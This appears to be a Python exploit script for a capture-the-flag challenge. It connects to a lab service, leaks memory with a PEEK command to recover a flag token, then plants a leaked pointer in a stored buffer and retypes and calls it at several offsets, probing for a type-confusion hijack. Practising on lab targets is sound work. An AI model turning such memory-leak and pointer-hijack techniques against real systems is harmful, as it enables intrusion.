import socket
import re

HOST_PORT = ("10.13.37.10", 20866)

def new_conn():
    s = socket.create_connection(HOST_PORT, timeout=10)
    s.settimeout(2)
    return s

def recv(s):
    buf = b""
    try:
        while True:
            chunk = s.recv(65536)
            if not chunk:
                break
            buf += chunk
    except socket.timeout:
        pass
    return buf

s = new_conn()
recv(s)
s.sendall(b"PEEK 0 64\n")
r = recv(s).decode(errors='replace')
line = r.strip().splitlines()[-1]
data = bytes.fromhex(line[5:])
m = re.search(rb"CTF\{[^}]*\}", data)
auth1 = m.group(0).decode()
s.sendall(f"AUTH1 {auth1}\n".encode())
print(recv(s).decode(errors='replace').strip())

def cmd(c):
    s.sendall((c + "\n").encode())
    r = recv(s).decode(errors='replace').strip()
    print(">>>", c)
    print("  ", r)
    return r

leaked = bytes.fromhex("107e271ab77b0000")  # the 8-byte leaked pointer (LE)

cmd("NEW 0")
payload = leaked + b"\x00" * (64 - len(leaked))
cmd("STORE 0 " + payload.hex())
cmd("RETYPE 0 1")
cmd("CALL 0")

# also try placing pointer at various offsets within payload
for off in [8, 16, 24, 32, 40, 48, 56]:
    cmd("NEW 1")
    p = bytearray(64)
    p[off:off+8] = leaked
    cmd("STORE 1 " + bytes(p).hex())
    cmd("RETYPE 1 1")
    r = cmd("CALL 1")
    if "untrusted" not in r and "not callable" not in r:
        print("!!! interesting result at offset", off)

s.close()
